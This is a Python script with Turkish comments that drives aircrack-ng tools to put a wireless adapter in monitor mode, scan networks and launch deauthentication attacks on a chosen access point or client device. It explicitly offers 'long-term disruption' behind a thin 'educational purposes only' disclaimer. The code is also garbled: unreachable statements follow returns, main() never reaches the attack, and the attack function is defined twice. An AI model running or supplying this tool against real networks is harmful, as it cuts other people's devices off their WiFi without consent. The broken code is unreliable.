import os
import subprocess
import time
import sys

# Warnings & Disclaimer mesajı
WARNING_MESSAGE = """
[!] WARNING & DISCLAIMER
This tool is for educational purposes only.
Unauthorized use may be illegal. Proceed with caution.
"""
CONSENT_MESSAGE = """
Do you accept the terms and conditions? (yes/no): 
"""

# Kullanıcı onayı fonksiyonu
def get_user_consent():
    print(WARNING_MESSAGE)
    consent = input(CONSENT_MESSAGE).strip().lower()
    if consent != "yes":
        print("Consent not given. Exiting program...")
        sys.exit()

# WiFi adaptör kontrolü
def check_wifi_adapter():
    result = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
    if "wlan0" not in result.stdout:  
        print("[-] No wireless adapter found or monitor mode not supported.")
        sys.exit()
    print("[+] Wireless adapter found and supports monitor mode.")

# Monitor moduna geçiş
def start_monitor_mode():
    print("[*] Starting monitor mode on wlan0...")
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
    time.sleep(3)

# Ağları tarama
def scan_networks():
    print("[*] Scanning nearby networks... Press Ctrl+C to stop.")
    subprocess.run(["sudo", "airodump-ng", "wlan0mon"])

# Kullanıcıdan hedef ağ seçimi alma
def select_target_network():
    target_mac = input("[?] Enter the target network MAC address: ").strip()
    return target_mac

# Deauthentication paket miktarı belirleme
def select_deauth_packet_count():
    print("[*] Choose deauthentication packet count:")
    print("Enter a number between 1-999 for a short interference")
    print("Enter 1000 or more for a long-term disruption")

    choice = input("[?] Enter the number of packets: ").strip()

    # Kullanıcı sadece sayı girmezse hata olmaması için doğrulama
    if not choice.isdigit():
        print("[-] Invalid input. Defaulting to 5 packets.")
        return "5"

    packet_count = int(choice)

    # 1 ile 999 arasında ise direkt kullan, 1000 ve üzeriyse sınırsız olarak kabul et
    return str(packet_count) if packet_count < 1000 else "1000"

# Deauthentication saldırısı başlatma
def start_deauth_attack(target_mac, packet_count):
    print(f"[*] Starting deauthentication attack on {target_mac} with {packet_count} packets...")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon", "--ignore-negative-one"])

# Ana fonksiyon - Akışı yönetme
def main():
    get_user_consent()
    check_wifi_adapter()
    start_monitor_mode()
    scan_networks()
def scan_connected_devices(target_mac):
    print (f"[*] Scanning devices connected to {target_mac}... Press Ctrl+C to stop.")
    subprocess.run(["sudo", "airodump-ng", "--bssid", target_mac, "-c", "wlan0mon"])



    
    while True:
        target_mac = select_target_network()
def select_target_device(target_mac):
    print("[?] Do you want to target a specific SSID? (yes/no): ")
    choice = input().strip().lower()

    if choice == "yes":
        scan_connected_devices(target_mac)
        client_mac = input("[?] Enter the target device MAC address: ").strip()
        return client_mac
    else:
        return None  # Direkt modem hedef alınacak
       
       
        packet_count = select_deauth_packet_count()
def start_deauth_attack(target_mac, client_mac, packet_count):
    if client_mac:
        print(f"[*] Starting deauthentication attack on {client_mac} in {target_mac} network...")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", "wlan0mon", "--ignore-negative-one"])
    else:
        print(f"[*] Starting deauthentication attack on the entire {target_mac} network...")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", "wlan0mon", "--ignore-negative-one"])


if __name__ == "__main__":
    main()


    